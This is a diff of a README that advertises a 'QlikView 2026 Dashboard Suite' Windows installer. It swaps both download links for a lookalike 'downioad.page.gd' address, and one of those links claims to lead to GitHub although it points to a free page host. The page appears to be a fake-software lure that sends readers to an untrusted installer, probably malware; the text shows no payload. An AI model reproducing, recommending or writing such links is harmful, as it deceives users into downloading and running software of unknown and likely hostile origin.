@@ -2,7 +2,7 @@
 
 The QlikView 2026 Dashboard Suite is a powerful Windows desktop application designed to enhance your business intelligence workflows. It offers a comprehensive set of tools for creating, managing, and sharing interactive dashboards with ease. This suite integrates advanced data visualization capabilities, making it ideal for professionals seeking to transform raw data into insightful reports.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -68,6 +68,6 @@ Here are some common questions and answers to help you get started:
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This tool is provided as-is for personal and professional use. For additional resources, documentation, or community support, visit the official QlikView forums. Last updated in 2026, the suite continues to evolve with user feedback to meet modern data analysis needs.
